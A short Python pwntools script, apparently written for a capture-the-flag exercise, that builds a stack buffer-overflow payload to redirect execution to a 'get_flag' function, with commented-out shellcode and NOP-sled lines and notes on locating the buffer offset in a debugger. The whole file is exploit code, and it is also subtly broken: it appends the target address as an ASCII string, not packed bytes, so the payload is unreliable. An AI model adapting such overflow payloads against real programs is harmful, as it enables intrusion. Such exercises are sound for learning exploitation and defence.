#!/usr/bin/env python3
from pwn import *

if __name__ == '__main__':
    # Read in the shellcode
    # with open("shellcode.shell", "rb") as file:
    #     shellcode = file.read()

    # Pad the rest of the payload with cyclic bytes until we get to the overflow
    payload = cyclic(86)
    payload += b'0x4011d6'
    #payload += p64(0x0000004011d6)
    # payload += shellcode

    # Return to the middle of our NOP sled.

    # with open("payload", "wb") as file:
    #     file.write(payload)


#print(cyclic_find('aawaaaxa'))
print(payload)



# get_flag address: 0x4011d6

#Find Buffer start: 0x7fffffffda90
# set break point after padding has been read in. Print out memory using 'x/200xb $rsp', look for the beginning of
# the padding sequence

# Buffer ends at 0x7fffffffdade (78)
# Determine size of buffer
# If using cyclic, determine where in the sequence ebp gets overwritten, then add that number to the buffer start address


